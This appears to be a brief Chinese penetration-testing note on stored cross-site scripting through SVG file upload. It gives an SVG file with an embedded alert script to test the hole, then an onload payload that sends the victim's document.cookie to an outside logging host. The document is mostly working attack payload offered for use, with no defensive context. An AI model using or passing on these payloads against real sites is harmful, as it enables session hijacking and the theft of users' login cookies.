当网站有文件上传，且可以回显。
以下改为svg后缀，文件上传，回显url。
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900"
stroke="#004400"/>
<script type="text/javascript">
alert(618);
</script>
</svg>
```
危害
```
<svg/onload="document.location='http://2qytvx.ceye.io/?'+document.cookie">
```